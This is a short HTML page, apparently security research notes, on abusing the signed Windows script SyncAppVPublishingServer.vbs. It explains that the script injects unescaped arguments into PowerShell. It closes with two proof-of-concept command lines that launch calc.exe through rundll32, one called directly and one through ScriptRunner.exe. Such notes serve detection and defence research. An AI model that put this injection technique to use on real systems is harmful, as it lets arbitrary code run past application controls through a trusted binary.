<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>SyncAppvPublishingService</title>
</head><body>PowerShell cmdlet for App Virtualization Publishing<br/>
&nbsp;&#09;Also comes with .VBS and .EXE helpers<br/>
&nbsp;&#09;Signed, default vbs script in Windows 10<br/>
&nbsp;&#09;It is portable!, so you can move it to Win 7/others. It requires .NET 4 and PSv3<ul><li style="list-style-type: none">Located in C:\Windows\System32\SyncAppVPublishing[Server|Service].vbs</li>
</ul>
<br/>
Helpers are provided to make it easier to call PowerShell cmdlet from outside PowerShell<br/>
&nbsp;&#09;Take args from cmdline<br/>
&nbsp;&#09;Format received data<br/>
&nbsp;&#09;Pass it to PowerShell module<br/>
<img src="image.png" /><br/>
<img src="image 2.png" /><br/>
<img src="image 3.png" /><br/>
<br/>
It builds both the PowerShell code and command as strings without escaping the arguments<br/>
Raw PowerShell commands can be injected into the session<br/>
SyncAppvPublishingServer.exe has these same vulnerabilities!<br/>
<br/>
<img src="image 4.png" /><br/>
<br/>
Shows as "SyncAppvPublishing" in Autoruns<br/>
<br/>
Full PoC: cmd.exe /c cscript.exe SyncAppVPublishingServer.vbs ".; Start-Process rundll32.exe 'shell32.dll,ShellExec_RunDLL calc.exe'"<br/>
<br/>
Alt: cmd /c ScriptRunner.exe -appvscript SyncAppVPublishingServer.vbs ".; Start-Process rundll32.exe 'shell32.dll,ShellExec_RunDLL calc.exe'"<br/>
</body></html>